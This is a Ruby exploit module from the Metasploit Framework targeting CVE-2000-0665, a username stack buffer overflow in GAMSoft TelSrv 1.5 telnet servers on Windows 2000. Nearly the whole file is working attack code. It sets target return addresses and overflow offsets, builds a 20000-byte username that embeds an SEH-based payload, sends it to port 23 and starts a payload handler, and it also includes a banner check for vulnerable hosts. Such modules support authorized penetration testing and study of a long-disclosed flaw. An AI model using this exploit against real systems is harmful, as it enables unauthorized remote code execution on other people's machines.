##
# $Id: gamsoft_telsrv_username.rb 4961 2007-05-22 21:15:14Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##

require 'msf/core'

module Msf

class Exploits::Windows::Telnet::GAMSoft_TelSrv_Username < Msf::Exploit::Remote
	include Exploit::Remote::Tcp
	include Exploit::Remote::Seh

	def initialize(info = {}) 
		super(update_info(info,    
			'Name'		=> 'GAMSoft TelSrv 1.5 Username Buffer Overflow',
			'Description'	=> %q{
            	This module exploits a username sprintf stack overflow in GAMSoft TelSrv 1.5.
			Other versions may also be affected. The service terminates after exploitation,
			so you only get one chance!
			},
			'Author' 	=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
			'Arch'		=> [ ARCH_X86 ], 
			'License'       => MSF_LICENSE,
			'Version'        => '$Revision: 4961 $',
			'References'    =>
			[
				[ 'BID', '1478'], 
				[ 'CVE', '2000-0665'],
				[ 'URL', 'http://cdn.simtel.net/pub/simtelnet/win95/inetmisc/telsrv15.zip'],
			],         
			'Privileged'		=> false, 
			'DefaultOptions'	=>
			{
				'EXITFUNC' 	=> 'thread',
			},
			'Payload'        	=>
				{ 
					'Space'			=> 1000,
					'BadChars' 		=> "\x00\x0a",
					'StackAdjustment' 	=> -3500,
				},
			'Platform' => ['win'],
			'Targets'  =>
			[
                 		[
				'Windows 2000 Pro SP0/4 English REMOTE',
				{
					'Ret'		=> 0x75022ac4, # pop/pop/ret ws2help.dll w2k pro en ALL
					'Offset'	=> 1886,
				}
				],
				[ 
				'Windows 2000 Pro SP0/4 English LOCAL (debug - 127.0.0.1)',
				{
					'Ret' 		=> 0x75022ac4, # pop/pop/ret ws2help.dll w2k pro en ALL
					'Offset'	=> 3318,
				}
				],
				[ 
				'Windows 2000 Pro SP0/4 English LOCAL (debug - dhcp)',
				{
					'Ret' 		=> 0x75022ac4, # pop/pop/ret ws2help.dll w2k pro en ALL
					'Offset' 	=> 3358,
				}
				],
			        #[
				#'Windows XP Pro SP0/1 English',
				#{
				#	'Ret' 		=> 0x71aa32ad, # pop/pop/ret xp pro en ALL
				#	'Offset'	=> 2600, # this is made up and absolutely wrong ;-)
				#}
				#],
				#[
			],
			'DisclosureDate' => 'Jul 17 2000', 
			'DefaultTarget' => 0))
            
			register_options(
			[
				Opt::RPORT(23),
			], self.class)
	end

	def check 
		connect
		print_status("Attempting to determine if target is vulnerable...")
		sleep(7)
		banner = sock.get_once(-1,3)

		if (banner =~ /TelSrv 1\.5/)
			return Exploit::CheckCode::Vulnerable 
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		print_status("Trying target #{target.name} on host #{datastore['RHOST']}:#{datastore['RPORT']}...") 
		connect
		print_status("Connected to telnet service... waiting several seconds.") # User friendly message due to sleep.
		sleep(7) # If unregistered version, you must wait for >5 seconds. Seven is safe. Six is not. 

		username = rand_text_english(20000, payload_badchars)
		seh = generate_seh_payload(target.ret)
		username[target['Offset'], seh.length] = seh
	
		print_status("Sending #{ username.length} byte username as exploit (including #{seh.length} byte payload)...")
		sock.put(username)
		sleep(0.25)
		print_status('Exploit sent...') 
		handler
		disconnect
	end

end
end
